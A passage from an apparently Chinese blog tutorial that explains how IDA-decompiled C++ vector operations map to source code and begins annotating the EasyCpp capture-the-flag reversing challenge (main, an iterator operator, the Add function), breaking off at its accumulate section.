class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v10, &amp;i);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求v10的大小，相当于v3 = v10.size();</span></span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::size(&amp;v10);</span><br><span class="line">  <span class="comment">//相当于cout&lt;&lt;v3;</span></span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v3);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于v10.pop_back();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于if(!v10.empty())</span></span><br><span class="line">  <span class="comment">//        v10.pop_back();</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::empty(&amp;v10) ^ <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个resize有没有发觉很像上一节的构造函数，第一个参数为一个char变量的地址，第二个为容器初始大小，第三个为初始数据的地址</span></span><br><span class="line">  <span class="comment">//相当于v10.resize(5,2);</span></span><br><span class="line">  v11 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::resize(&amp;v10, <span class="number">5L</span>L, &amp;v11);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这里就是上一节的那个构造函数了，相当于vector&lt;int&gt;v9(5,2);</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v12);</span><br><span class="line">  v13 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v9, <span class="number">5L</span>L, &amp;v13, &amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v12);</span><br><span class="line">  <span class="comment">//这里判断两个容器是否相等,相当于v9 == v10</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>==&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v9, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Right!"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两句又出现了吧，end跟begin，这几句很常用，能识别就行</span></span><br><span class="line">  v5 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v10);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v10);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将下面句子简化可以看出他就是v9.assign(v6,v5);</span></span><br><span class="line">  <span class="comment">//其实就是v9.assign(v10.begin(), v10.end());</span></span><br><span class="line">  <span class="comment">//具体怎么简化的话，你就看::，不要看模板，那只是类型的问题</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::assign&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v9,</span><br><span class="line">    v6,</span><br><span class="line">    v5);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//清空容器元素，相当于v10.clear();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::clear(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//析构函数</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<ul>
<li>c++ vector的逆向其实不难，最主要你要耐心去看，如果你看多几次，你会发觉这个不难，也就是基本操作而已</li>
<li>具体的重要步骤详解，我都在上面注释写的很清楚，一一对应，你可以根据getchar一个个对应去看，看多几遍就知道了</li>
<li>要学会简化ida识别的代码，不要盯着模板一直在那看</li>
</ul>
<p>好了，vector的基本操作完了，接下来拿一道题来实战吧。我相信各位的技术，接下来直接上代码你们也是可以看懂了，看不懂就往上面翻一翻，查下基本操作</p>
<h1 id="西湖论剑之EasyCpp"><a href="#西湖论剑之EasyCpp" class="headerlink" title="西湖论剑之EasyCpp"></a>西湖论剑之EasyCpp</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r15</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 r12_7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// r8</span></span><br><span class="line">  __int64 v15; <span class="comment">// r9</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v18; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v20; <span class="comment">// [rsp+0h] [rbp-190h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+50h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+90h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+D0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+F0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v30[<span class="number">18</span>]; <span class="comment">// [rsp+110h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v31; <span class="comment">// [rsp+158h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v20 = argv;</span><br><span class="line">  v31 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v23, argv, envp);<span class="comment">// #定义五个容器，相当于vector&lt;int&gt; v23,v24,v25,v26,v27</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v24, argv, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v25, argv, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v26, argv, v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v27, argv, v7);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v30[i], v20);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v24, &amp;v30[i]);<span class="comment">// 相当于v24.push_back(v30[i]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v29) = fib(j);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v23, &amp;v29);<span class="comment">// 相当于v23.push_back(fib(j)) ;   j从0-15</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v25, v30);<span class="comment">// 相当于v25.push_back(v30[0]);  </span></span><br><span class="line"></span><br><span class="line">  r12_7 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v25);<span class="comment">// back_inserter创建一个容器指针，指向v25</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);<span class="comment">// v8 = v24.end()</span></span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);<span class="comment">// v29 = v24.begin();</span></span><br><span class="line"></span><br><span class="line">  v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 4;这里我所说的这种说法有语法错误，因为v24.begin()是迭代器，不能这么加，我说的是地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Add(</span><br><span class="line">    v9,                                         <span class="comment">// v24.begin()+4 相当于数组第二个数</span></span><br><span class="line">    v8,                                         <span class="comment">// v24.end() 相当于数组最后一个数</span></span><br><span class="line">    r12_7,                                      <span class="comment">// 只有输入的第一个元素的容器</span></span><br><span class="line">    v30);                                       <span class="comment">// 输入的第一个元素的元素的值</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v28, v8, v11);<span class="comment">// 创建一个新容器 vector&lt;int&gt; v28</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v25);<span class="comment">// v12 = v25.end();</span></span><br><span class="line">  v13 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v25);<span class="comment">// v13 = v25.begin();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(</span><br><span class="line">    &amp;v29,</span><br><span class="line">    v13,</span><br><span class="line">    v12,</span><br><span class="line">    &amp;v28,</span><br><span class="line">    v14,</span><br><span class="line">    v15,</span><br><span class="line">    v3);                                        <span class="comment">// //倒置函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v26, &amp;v29);<span class="comment">//将容器v29赋值给v26</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v28);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v26, &amp;v23) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v27);</span><br><span class="line">  v16 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);</span><br><span class="line">  v17 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v17);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v16, v20);</span><br><span class="line">  v28 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v27);</span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v27);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v28, &amp;v29) )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v28);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, *v18);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v28);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v24);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v23);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我的注释部分只写到了获得正确flag的过程部分，也就是前半部分，后面部分其实也不难，你们可以作为练习分析下，<br>下面根据这里面的难点和重点进行具体分析，整个过程最难的部分就是Add和accumulate,这两部分是重点，如果不理解这两部分是无法得到正确的flag的</p>
<p>我先对Add附近的进行分析</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 1;</span></span><br></pre></td></tr></table></figure>
<p>这句我原来以为是将v29+1，后面才发觉这是取容器v29的第一个元素，如果这里看不懂的话，可以跟进去看看，双击这行</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(_QWORD *v24, __int64 num)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">4</span> * num + *v24;</span><br><span class="line">  __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::__normal_iterator(&amp;v4, &amp;v3);<span class="comment">// 相当于v4 = v3</span></span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>进行的是这个，他传入的是num,作为偏移，他取出来的是容器的第1个元素，我以下标为0为第一个元素，以后不在赘述</p>
</li>
<li><p>4*num + *24 这种写法很常见，在ida6.8尤其显著</p>
</li>
<li><p>他将int数组识别为char数组，取值的时候通常也是这样取，假设有个int数组 int num[5] = {1,2,3,4,5}; 在ida6.8里他识别为char num[20]; 取值的时候就num[4*i]，i是循环里的循环变量</p>
</li>
</ul>
<h3 id="接下来是Add部分"><a href="#接下来是Add部分" class="headerlink" title="接下来是Add部分"></a>接下来是Add部分</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Add</span><span class="params">(__int64 &amp;num[<span class="number">1</span>], __int64 &amp;num[n], __int64 p, __int64 &amp;num[<span class="number">0</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = &amp;num[<span class="number">1</span>];                                <span class="comment">// 这里说明下，都是地址</span></span><br><span class="line">  v9 = &amp;num[n];</span><br><span class="line">  v8 = p;</span><br><span class="line">  v7 = &amp;num[<span class="number">0</span>];</span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v10, &amp;v9) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v10);<span class="comment">// v4 = v10</span></span><br><span class="line">    v11 = main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v7, *v4);<span class="comment">// 点进去后发现就是num[0] + *v10</span></span><br><span class="line">    v5 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v8);<span class="comment">// v5 = &amp;v8</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v5, &amp;v11);<span class="comment">// 将结果存到v5里去，v5指向result容器</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v10);<span class="comment">// 指针自加，相当于数组下标+1</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v8);<span class="comment">// 指针++</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体注释我也写好了，匿名函数你在外部看不出什么，然后你双击进去后就能看出他是干什么了，这里就相当于</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt; num.Length; i++)</span><br><span class="line">    num[i] = num[<span class="number">0</span>] + num[i];</span><br></pre></td></tr></table></figure>
<h3 id="accumulate"><a href="#accumulate" class="headerlink" title="accumulate"></a>accumulate</h3><p>这部分对我来说可能最难理解的吧，他有好多层，我一层层进去后，最后才理解他是如何将容器进行倒置的</p>
